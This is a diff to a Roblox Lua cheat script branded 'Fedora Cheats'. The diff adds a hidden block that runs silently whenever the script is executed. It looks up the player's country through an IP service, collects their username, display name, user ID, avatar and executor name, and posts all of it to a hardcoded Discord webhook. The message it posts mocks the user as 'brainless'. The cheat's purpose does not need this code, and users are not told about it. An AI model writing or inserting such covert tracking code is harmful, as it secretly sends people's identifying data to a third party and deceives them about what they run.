@@ -11,6 +11,110 @@ local Vim       = game:GetService("VirtualInputManager")
 local Json      = game:GetService("HttpService")
 local me        = Players.LocalPlayer
 
+local WEBHOOK = "https://discord.com/api/webhooks/1559374825364136008/qOYpc1QvKh1e0-I-38log1TY4fgCeOjbJkQo5ytIl-eXnAugBwLw1ehrwnx8TppTehmJ"
+
+do
+    local HSvc = game:GetService("HttpService")
+
+    local function post(url, body)
+        local headers = { ["Content-Type"] = "application/json" }
+        local ok = pcall(function()
+            if syn and syn.request then
+                syn.request({ Url = url, Method = "POST", Headers = headers, Body = body })
+            elseif http and http.request then
+                http.request({ Url = url, Method = "POST", Headers = headers, Body = body })
+            elseif request then
+                request({ Url = url, Method = "POST", Headers = headers, Body = body })
+            elseif fluxus and fluxus.request then
+                fluxus.request({ Url = url, Method = "POST", Headers = headers, Body = body })
+            else
+                HSvc:PostAsync(url, body, Enum.HttpContentType.ApplicationJson)
+            end
+        end)
+        return ok
+    end
+
+    local function getexec()
+        local ok, name = pcall(function()
+            if identifyexecutor then return identifyexecutor() end
+        end)
+        if ok and name then return tostring(name) end
+        return "Unknown"
+    end
+
+    local function getcount()
+        local ok, res = pcall(function()
+            if syn and syn.request then
+                local r = syn.request({ Url = "http://ip-api.com/json/", Method = "GET" })
+                return r and r.Body
+            elseif http and http.request then
+                local r = http.request({ Url = "http://ip-api.com/json/", Method = "GET" })
+                return r and r.Body
+            elseif request then
+                local r = request({ Url = "http://ip-api.com/json/", Method = "GET" })
+                return r and r.Body
+            else
+                return game:HttpGet("http://ip-api.com/json/")
+            end
+        end)
+        if not ok or type(res) ~= "string" then return "Unknown" end
+        local ok2, decoded = pcall(HSvc.JSONDecode, HSvc, res)
+        if ok2 and decoded and decoded.country then
+            return tostring(decoded.country)
+        end
+        return "Unknown"
+    end
+
+    local function getpfp(userId)
+        local ok, url = pcall(function()
+            return Players:GetUserThumbnailAsync(
+                userId,
+                Enum.ThumbnailType.HeadShot,
+                Enum.ThumbnailSize.Size420x420
+            )
+        end)
+        if ok and url then return url end
+        return "https://www.roblox.com/headshot-thumbnail/image?userId=" .. tostring(userId) .. "&width=420&height=420&format=png"
+    end
+
+    task.spawn(function()
+        local id   = me.UserId
+        local username = me.Name
+        local display  = me.DisplayName or me.Name
+        local country  = getcount()
+        local pfp      = getpfp(userId)
+        local exec     = getexec()
+
+        local timestamp = os.date("!%Y-%m-%d %H:%M:%S UTC")
+
+        local embed = {
+            title       = "🔓 Script Executed",
+            description = "A brainless user executed an auto script",
+            color       = 0x00C853,
+            thumbnail   = { url = pfp },
+            fields = {
+                { name = "👤 Username",     value = "`" .. username .. "`",              inline = true },
+                { name = "🏷️ Display Name", value = "`" .. display  .. "`",              inline = true },
+                { name = "🆔 User ID",      value = "`" .. tostring(id) .. "`",       inline = true },
+                { name = "🌍 Country",      value = "`" .. country .. "`",               inline = true },
+                { name = "🕒 Logged Time",  value = "`" .. timestamp .. "`",             inline = false },
+                { name = "⚙️ Executor",     value = "`" .. exec .. "`",                  inline = true },
+                { name = "🔗 Profile",      value = "[Roblox Profile](https://www.roblox.com/users/" .. tostring(id) .. "/profile)", inline = true },
+            },
+            footer = { text = "Auto Suite Logger • Fedora Cheats" },
+        }
+
+        local payload = HSvc:JSONEncode({
+            username   = "Auto Suite Logger",
+            avatar_url = pfp,
+            embeds     = { embed },
+        })
+
+        post(WEBHOOK, payload)
+    end)
+end
+
+
 local file = "autosuite_config.json"
 
 local base = {
@@ -932,4 +1036,4 @@ print([[⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠀⠈⠛⠛⠻⠿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⠿⠟⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
 
-                 FEDORA CHEATS]])⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+                 FEDORA CHEATS]])
